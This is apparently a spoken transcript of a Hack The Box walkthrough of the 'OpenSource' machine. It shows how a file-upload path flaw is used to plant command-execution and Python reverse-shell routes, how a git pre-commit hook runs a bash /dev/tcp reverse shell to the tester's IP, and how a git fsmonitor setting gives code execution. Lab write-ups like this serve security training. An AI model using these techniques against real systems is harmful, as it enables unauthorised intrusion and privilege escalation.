 what's going on YouTube this is ipsag me to an open source from hack the box and I really enjoyed this machine because it starts out with just a simple python file upload application and the author gives you the source code so you can do some source code analysis to find the vulnerability but the vulnerability itself is common enough most people know how to tack file upload so you could have skipped the source code analysis but if you do you'll have trouble with the next step because the author provided you the source code with the dot get file so you could go through other branches and commits and find a hard-coded credential which is used to log into the get T interface that you need to Pivot through the web server to access and git T is just like a git repository or whatever to share code um looking through that you find a SSH key and get T to log into the box and then the prevask is the author coded something to automatically update his repository with Git T but you can modify his git config to get code execution either modifying the config file itself which allows code execution on pretty much any command so it can get status command but the con is doing a up like a push so you can put a pre-commit hook in and get code execution that way but enough talking let's just jump into the box as always we're gonna start off with an end map so Dash SC for default scripts SV enumerate versions OA I'll put all formats put in the nmaps directory and call it open source and then the IP address of 10 10 11.164. this can take some time to run so I've already ran it looking at the results it looks like three ports are open because it scans 1000 ports by default and we're at 997 so the first Port is SSH on Port 22 and its Banner is telling us it's an Ubuntu box specifically this version which because I've done this a hundred times I know this is Ubuntu bionic which is I think version 18. the second thing we have is HTTP on Port 80 and it's running work Zug and python version 3. 10 which is odd but we'll get to that in a second finally the last port is three thousand and it's just telling us it's filtered so there's nothing there it just means there's a firewall or something because this port is behaving differently than all the other ports um generally when people put an IP table tool in they say drop the packet instead of reject the packet and what drop does means it drops a packet it doesn't take any actions after that if you do reject then um the Box itself will tell you the port is not listening it sends a reset connection back so um I'm guessing every other Port responded with a reset this one didn't respond at all so and Maps telling us it's filtered but more about this so this is Ubuntu bionic and I know Ubuntu bionic ships with like python 3.6 but this is Python 3.10 and that is weird right we can confirm this by if we go just Google what is it um for Ubuntu 0.7 so I'm going to Google this and I'm going to go to the packages ubuntu.com and we see 7.6 P1 7.6 P1 for ubuntu07 and this is part of bionic it's telling us right here and if we look at bionics python version so let's see if we go to bionic updates let's just search python packages so I'm going to just search package name for python 3.10 right and we can see it's an Ubuntu impish Jammy and kinetic we don't see bionic here if we do python 3.6 we see bionic is listed because that's the version of python that runs with Ubuntu bionic by default 3.8 could also be bionic we see that listed here but since it's not listed I'm going to guess there's some type of um doco running just because generally when this happens it's going to be Docker on hack the box but it could just mean it's a different box altogether and you have some Network address translation going on um just a fancy way of saying Port 22 and Port 80 are not going to the same operating system but enough of that Recon talk let's look at the actual website so if I go to 10 10 11 164 we get a website that says up cloud and looks like these links go nowhere see looks like we can download the source code so I'm going to do that and then we can do take me there we go to a file upload form let's see what else do we have if we click on this menu thing Twitter Facebook email everything else is going nowhere so let's take a look at the download so that was was the file name source.zip so I'm going to move downloads source.zip to my directory and I know we could try starting off by uploading files but I'm more interested in looking at source code right now whenever I get a chance to like black box test something or just look at the source code I always go um for this voice code so I'm going to make a directory just in case this cloud is my directory when I unzip it so I'm going to unzip source.zip and we can see it put files in my current working directory so that's why whenever I unzip things I always create a directory first so I can see that and right off the bat we see build docker.sh confirming that um it is running docker it's not telling us what image it's pulling I'm gonna guess this is Alpine but maybe the dockerfire will uh Python 3 Alpine so that is the docker image that it's pulling from but let's go and examine this code so I'm going to open up codium and we can file open folder and then let's see htb [Music] this is open source and web source I'm just going to open this app I think app is the director I want is there anything in config that's a python file nope that's Docker config so let's open this and if I look at run.pi it's just going to listen on Port 80 uh public this is where it uploads is going to go so public uploads if this was a PHP app I would be testing like slash public uploads make sure this directory exists it does not maybe just slash uploads it does not um okay I thought it would but maybe not if we go to views we can see there is uploads and just slash looking at util configuration there's not that much information here we have a DOT vs code directory but nothing in it if I look at a get log we can see there's different commits so I'm going to do a git show on the latest commit to see what was changed if I did it on this bottom commit then um it would just be a mess because that's adding everything right so looks like they set the environment mode to production and took debug mode off now if we do a get Branch command we can see there's multiple branches of this so I'm going to do a git check out Dev to switch over to the dev Branch if I do a git log here we see a lot more files here and additionally if I go back to Here My Views has changed we do have a download functionality and I guess this is how source.zip is downloading I'm not sure if that was there before [Music] um and then we have a up Cloud this is how it uploads and off the bat I'm noticing there is a vulnerability this os.path.join let's play with this real quick to show you um so python3 import OS and if we do os.path.join and then app ipsec it's going to generate this path for us right if we do dot dot slash it puts that there but that's not really that interesting because if we prefix something with a slash it erases everything before it because it's normalizing a path and when a path begins with Slash it just goes back to the beginning right so how can we abuse this well this file upload is trying to trap us in this public uploads directory but because we control the file name at least I believe we do f is equal to request.files file and get file name right here if we look at this what function is this app utils get file name so um oh git file name is actually blocking dot dot slash and I'm guessing I guess this is replacing it with um nothing so we can't do this dot dot but we can begin it with a slash because it's not replacing um begins with Slash it's only replacing dot dot slash to prevent that type of directory traversal but since we can now overwrite this we can write anywhere on the file system so if this was running as root we could probably overwrite a cron if we knew what user we were we oh if it's root we can buy this right to Etsy contact and get code execution that way um I don't know what user we're running as Let's test that I did not actually do that when um playing with this box before I recorded the video so let's see Let's test this out so if we create a malicious file so I'm just going to go in open source and what should we do um I'm just going to make it ping so we'll just do ping 10 10 14 8. and W get 10 10 14 8 port 8000. and I'm doing um a w get as well because what if ping doesn't exist on the system which is somewhat common actually for a Docker so I'm just trying multiple things this one can be a TCP dump Dash I ton zero icmp okay and let us try to upload a file so take me there let's switch over to burp suite and then upload a file so let's switch to the directory hdb open source that's not what I want to do hdb open source let's open keys source and then test.sh upload go over to burp and we're going to change the file name to slash Etsy cront tab and I just realized we probably want to put the actual cron entry N I think it's five stars let's see uh cat Etsy cront tab one two three four five the username and then the command so root like that and then which ping user bin which W get user bin okay and let's actually send this to repeater so we can see what it says we see a file has been uploaded so if I look at the date maybe in a minute or 40 seconds we'll see some code execution so I'm going to pause the video and we'll just see what happens so it's been over a minute and we still don't have any hits so I'm guessing this path does not work now in Python if you run things in debug mode which we did see in the git config that there is an environment set so maybe this web server is running in debug mode um when you update a file it auto reloads the python file so if we edit our actual config then we may be able just to add functionality so maybe just add a code execution endpoint right so what I want to do first is figure out exactly where in the code we are so I'm going to try let's hitting slash uploads and not giving it a path so I'm going to do let's see go back here we can turn drip Suite off if I just hit slash uploads not found and we give it a fake file we get an error and an error message and this is certainly what we wanted um because we can see this file is running in app app views.pi and this is work Zog but and if this was an old version of wordzog we'd be able to click this like open interactive shell and then type a PIN code and well it wouldn't ask what pin code the PIN code is in um I guess version of work Zog like after 2016 this is a super old vulnerability but in super old versions of this you could just click that and it would open a python interpreter but in this one we can't do that it does leak however the file name so app um app views.pi so let's go and create a new route so what I'm going to do is copy this uploads route and we're going to do app route and let's see I'm going to add a CMD route and we can call this run command and then pipe CMD so what this is doing is just saying um what's after uploads gets assigned to CMD and we're passing that into this so here we can import sub process and we probably should do the import at the top of the program but it really doesn't matter so we can do SUB process dot check output and then we want to do CMD dot split like this I believe and the reason why we're doing um cmd.split is because this subprocess.check output is expecting a array um if we do it over in a new terminal python3 import sub process sub process dot check output is it underscore yeah if I just give it ID oh looks like it works by yeah like that it also works so I wonder if I do Echo test no such file but if I put this in a dictionary so Echo comma test then it works so that's why I'm doing this because subprocess.check output it's expecting the binary to be the very first parameter and then everything else after it is arguments if you didn't put it as a array Or List whatever you want to call it then it's going to think Echo tested the name of the binary and it doesn't work so that's why I do that split so if we have um Echo test like this and we call Dot split it's going to put that in the array for us so that's why I did that and we can save this actually we should do run and now if I upload this so let's go back here upload file web Source app uh views make sure we are going to intercept this request um and then upload because we have to change this to oh shoot was it app apps see where is the file app app views like that I'm just gonna put that in a repeater save it file has been uploaded so now if I kill burp sweet and we do slash run ID we have our Command um if I do Echo test do I have a space I do um the downside to this is because I'm using the sub process check output it's not going to be command injectable which means like special characters like pipe and stuff won't work my first thing to do is like a witch bash to see if bash exists so which Bash oh returned on zero which sh sh exist so bash does not exist on the system the reason why child sh second is I want to see if like um the command which did not exist on this box but bash does not which means we probably can't use a reverse shell and I'm not going to do the netcat reverse shell because it's using a lot of special characters and it's just a pain right um to demo this let's see let's Echo please subscribe to base64. right and if I go here we can do Echo this and we see that if I do now a pipe base64--d it's not um doing the pipe as we expect is just treating it safely and not executing so this is why I'm not using that weird like MK fifo for file and file out netcat shell um it is python though so I'm just going to Google python reverse shell and we're going to give ourselves a shell so payload all the things let's see there should be a python shell or is it so cat python and I don't know what the difference between these three are they look the same let's just try the first one first um copy this whole thing and then we can paste it and we'll also give a new route and we're going to call this rev shell and we'll put IP as a parameter get rid of whoops these and now we just gotta clean up this code so import socket OS Pi that's fine socket s connect this can just be IP come on I should have done like a search and replace it to fix this it would probably work with [Music] um out breaking out all their semicolons but it's just not pretty so now we're adding a REV shell endpoint on IP um we'll call this rev shot like that and let's test this out so I'm just gonna copy and paste this that should work uh we only need to add this function so copy go back here and hope this works so send file has been uploaded so now if we hit rev shell 10 10 14 8. what port was this I did not update that that's four two four two um I'm just going to put it for 9001 because I can so let's do nclvmp 9001 hit this and we get a shell so the first thing I'm going to do is clean up my terminal so Python 3 Dash C import PTY pty.spawn bin bash like that oh not bash sh because bash does not exist on this system right so now we can do stty um raw minus Echo FG there we go and we're on the system so if I do ID we are root so if I go to Etsy cat cront tab that's like that I wonder if kron's not working on this or maybe my cront tab needed like Ben sh like that is that how my contact looks on my system no but it does have shell and path I wonder if that's what we needed like that which wget user bin wget so that should be working so if I ever see a w get come across I don't know that was the error if I don't see a w get come across then um I'm going to guess KRON doesn't work inside the stalker container which wouldn't be a huge surprise um it's actually bothered me I'm just going to wait five seconds I don't even have to pause the video so now we should be doing a w get and we don't so I'm going to guess cront tab is not working on this Docker container because if I copy this it does actually work and we can see it get hit so okay now that we're in this container what can we do the first thing let's go um it's not very dub dub it's app and see if we have any credentials anywhere right lsla uh dot vs code it's probably nothing here nope see less run dot pi this is the same thing we had seen um app there is a configuration don't really have anything here there's no database so there's not much we can get from this container um so the next thing we should look at is that Port 3000 right so if I do ipaddr we can see my IP address 172 1702 which is a standard Docker um we knew we're in a Docker thing we can cat Docker and vanilla in there but the host is going to be 0.1 and we can test this by NC 172 170.1 on Port 22. we see this um for Ubuntu 0.7 7.6p1 which we saw earlier in the video so we know um that works we can also go to Port 3000 and see what this is or do like zv to connect and we see it's open um I'm gonna guess this is going to be a web server so let's see do we have a get we can just do get slash HTTP 1.1 so get slash like this um it's missing the host header but this is definitely a web server because something responded to us right so um get slash HTTP 1.1 like that and then host it's host right yep uh 172 1701 like that and we get a page back and if we wanted to we could look at the headers right and see if this tells us anything so 200 okay nothing too interesting uh we see this cookie I like get tea so this is a get T page so let us upload chisel to the box so we can access this from our own environment right so I'm going to Google chisel GitHub to just download this real quick we'll set up a tunnel to access this download this uh Linux AMD 64. I think this will work on um Alpine let's go to cdtam make the dub dub dub move downloads chisel then gunzip Dash D move this to just a quicker easier name to type and python3-am HTTP server already in use oh I should not have started that web server not in like a dub dub dub directory because people could have downloaded some notes not a good habit to be in not going in www first and starting a web server but I digress let's W get 10 10 14 8.8 000 chisel and it is now downloading so what we want to do is start a chisel server so chmod plus X chisel server dash dash reverse it wants to bind on port 8080 so I'm going to do Dash Port 8001. so now we're listening on 8001 so we can do dot slash chisel client and the reason why we're client is clients are always going to be the one connecting to the server if we stood up chisel in a server mode on like Port 8000 here there's no guarantee we'll be able to reach it actually I know we can't because we're in a Docker container and the 10 10 11 address um won't automatically route inside the stock container on other ports so we have to be in client mode and then we want to specify 10 10 14 8. Port 8001 and we're going to say r socks and that was a bit messy because we got like a standard and out thing as we're working so that's what it looks like if you're trying to copy so we see it connected and we see we open port 1080. so now if I go to Firefox we can do proxy 1080 and I should be able to hit 172 1701 which is the docker IP and we can so if I try Port 3000 we see get t and it's also telling us the version if we looked at this I don't believe it's vulnerable to anything um go to sign in and we need credentials so if we pillage the get thing we had downloaded more we may find old credentials right and I'm saying that because um the web source and this get log has a lot of commits so if we just get show each commit so let's look at this one let's see what has changed adding adding routes get log get show ing a get ignore oh because they added a lot of directories there and they actually remove something so if we went to the very first commit we'd probably see something in this like I'm guessing this is vs code yeah vs code settings.json and they hard-coded the HTTP login so um in vs code you can configure it to automatically use git so you don't do any of the commands and when you do it through HTTP login it's got to save the credentials somewhere and here we see it saved right so if I log in with these credentials dev01 soulless developer we get logged in here and we could also for good measure um check SSH right so let's open a new tablet gas sh dev01 at 10 10 11 164. and we just get permission denied right away because password login is disabled so I bet if we did let's see Dash V what's this tell us um tries a bunch of private keys there is a command to not try private keys because if we tried this on like a Windows SSH server without specifying a option it's automatically going to do this because Windows treats each of these as a login attempt and I think after three login attempts it just kills you right so if we were doing um if we wanted to force it to only do a password login we can do the option of preferred Authentication make sure I type that right preferred authentication I'm going to camel case this and that can equal password and let's see did I typo that easily test with Google we have to turn the proxy off come on authentications okay and we still get denied and that's just going to change the order so it does a password login first but the server is just set up to only allow public key authentication we can see authentication that can continue public key so um let's go back to get T since we logged in and there is a repository this home backup so I'm going to go here it's going to direct me to open source.htb so let's just add this in a host file so sudo VI Etsy hosts and we will do 10 10 11 uh no yeah 10 10 11 164 is the IP put open source.hdb refresh this page and hopefully it works oh shoot um we can't do that one we have to do the 172 address 172 1701. and we also have to turn a proxy back on refresh 404 does not exist I guess we're no longer logged in dev01 see where was that file right here so list developer 2022 as important note if you're watching this video in a few months and this credential did not work I would have tried 2023 or maybe 2021 and just try a bunch of different credentials right so let's try dot SSH this looks like it is the home directory right we can look at bash history as well to see if there's anything in here nothing but SSH is interesting and we have ID RSA so we can go and download this key so let's add this so we're going to call this whose key is this if we go up one directory uh to idrsa Pub it is Devo one so I'm going to call this devo1.key paste the key in chmod 600 now let's see if we can log in with it so sh Dash I devo1.key and then dev01 which is the user 10 10 11 164. thinking and we get logged in and this is in Ubuntu 18 box just like we thought from all right initial nmap scan so if we do lsla we can see the user.txt file is here and we see also looks like May 4th is when this directory got created October 6th that is today so it looks like dot get is being modified constantly um 2122 what time is it it is that exact minute so that right off the bat is odd that something keeps modifying dot get if we go into dot SSH we do have stuff on March 23rd so it looks like the user got created May 4th and then stuff happened with SSH on March 23rd and generally the first thing I do when um fantastic box is not run lint piece right away but search for file the search the file system for files between a certain time and that's going to be probably March 23rd because we know deva1 was on this box then he added his keys what else did he do on March 23rd right so that's always something good to look at we can do that with a find command so if we do a find slash with Dash newer MD for newer modified time then 2022 the year merch which is 03 the date let's do newer than merch 22nd and then do it not with an exclamation point I'm going to do newer Mt yet again and say 2022.0324 and then I'm going to do a dash LS so it shows us all the permissions and then we also want to hide error messages with to Dev null so now we have a list of a bunch of files of interest I'm going to do a less Dash capital S and that's going to pipe this to less and the dash s is going to um not do line splitting like this so it's just easier to read and we have a bunch of stuff right um I don't care about anything in git and if you do and Ampersand then exclamation point this is going to like remove things from your find view right so I'm going to do Ampersand exclamation point we see not match and I'm going to say dot get um let's actually escape the period get and put a slash so now we just hit everything with DOT get um we see nothing else of interest in home so I can just go down we have this Etsy thing I'm looking at it doesn't seem too interesting opt gitlab nothing really interesting there um only enough the up git lab changes like the whole tabbing and it's because this one is created by gitlab psql so that's why the whole I guess tab indentation changed now this is going to be annoying because we have a lot of python junk all right so I'm going to do an ampersand um I think I am there we go and then exclamation point for not match and I'm going to do py dollar sign to not match anything that ends in P Y and now suddenly that is removed um so it makes it a bit easier to go through right we can also like um Ampersand exclamation point desk packages hide that as well um don't really see anything interesting and use a lib use a share no user bin nothing really interesting there um oddly enough there is a user local bin get sync and this is really interesting to me because anything in user local this is not created by a package manager this means the administrator likely put this file here right so I'm going to look at this get sync it is owned by root we can't modify it only root can but we should look at that file um looking else we have D package on devop gitlab this is another gitlab thing and nothing else so this user local bin git sync really sticks out I'm going to cut it and we can see it's just a bash script and this is going to explain why that got dot get directory keeps getting updated because there is a crown running constantly if I do it lsla now we can see it's 21.29 I want to say that was 2122 last time we looked at it so if I do a date again 30 look at this and we can see it gets updated if we didn't see it updated like this we could upload like piece by to the system and um see it that way we could also just do a watch Command right so if I do watch dash n for Interval let's do every half a second and we'll do a ps-e-f and gretford get sync I want to say it was get sync and we're going to wait for the new minute so I'm going to uh pause the video and we're just going to wait for this to get closer to the minute okay we see 58 59 new minute and it is running this get sync program so now we have confirmed this is indeed going to be executing constantly so let's take a look at this now that we know someone is running it to see if there is a vulnerability so it's doing get status I don't know what porcelain is I have no idea what that command means but if this exits with a um I guess non-zero code that says no changes so if I do Echo like that I think that does The Last Exit code right Echo test um I think it's dollar question mark Echo dollar question mark yeah that's the exit code so if I do this get status porcelain and we check this it is zero so I wonder if I touch a file ipsec let's do git status porcelain that's telling me the new file and I look at this exit code and it's still zero huh so I'm guessing there's a bug in the script because that if then is always going to go down the same exact path because here there's no new files it's still exited zero here there is a new file and it still exits zero so let's cat that again real quick so we know it's always going to be zero so I think it's always going to detect changes and this is probably explaining why the home directory is always getting updated every minute because this command doesn't work right they should have like got the output and said hey if this output is greater than um or one line or more then go down here if this output is no lines then Echo no changes something like that but that is definitely a mistake in this bash script um and it's always just going to do a git commit so the easiest way to exploit this is just editing a hook so if I go into this dot get directory we can go into Hooks and see where we can hook things right there is a pre-commit hook so pre-commit.sample and we can see it's going to execute a command before that right so I'm just going to create pre-commit and we'll do bin sh like it said and then I'm just gonna do bash bin Bash and then bash Dash I Dev TCP 10 10 14 8 9001 zero and one like that well CH mod plus x with pre-commit and nclvmp 9001 look at the date it's going to exit or execute in a minute I'm just gonna put something in ipsec so we'll Echo Please Subscribe into ipsec so that way if it um detects changes it will commit them right I'm not sure if it would have committed without this because it may run like the get commit and something may happen before it that says well this has already been committed so we're just going to exit but this should work in 20 seconds so date sleep 20 I'm going to pause the video and we'll resume it um close to this and the Sleep has finished and we get a shell so like that we are now root on this box so I can go into slash root and Cat root dot text right um there are other ways you can weaponize this whole git um directory generally whenever you have control over a configuration director you can get um code execution so I'm going to do is remove or pre-commit and let's see there is let's see get config it's either F I think it's FS monitor FS monitor code execution see and here I think this blog post talks about it so they're adding this here and what's cool about doing it this way is it would execute on the get status command it wouldn't require for us it requires them doing a uh commit because we're on a pre-commit hook but if we did it this way it would just work on the status Command right so let's see date I'm actually going to yeah we can just do this quickly right so let's do V config and we can say FS monitor is equal to ID right to home Devo one uh please subscribe and this probably goes in quotes it does yeah it does I think they're echoing it yeah they have it in quotes so we save this and we do a get status and do an lsla we can see Please Subscribe is created by me right um if I wait a minute it'll be now created by root probably um we have to delete the file for it to be created by root but if we remove it lsla doesn't exist get status and now it does so that's another way you could persist and get configs there's probably more but hope you guys enjoyed that video take care and I will see you all next time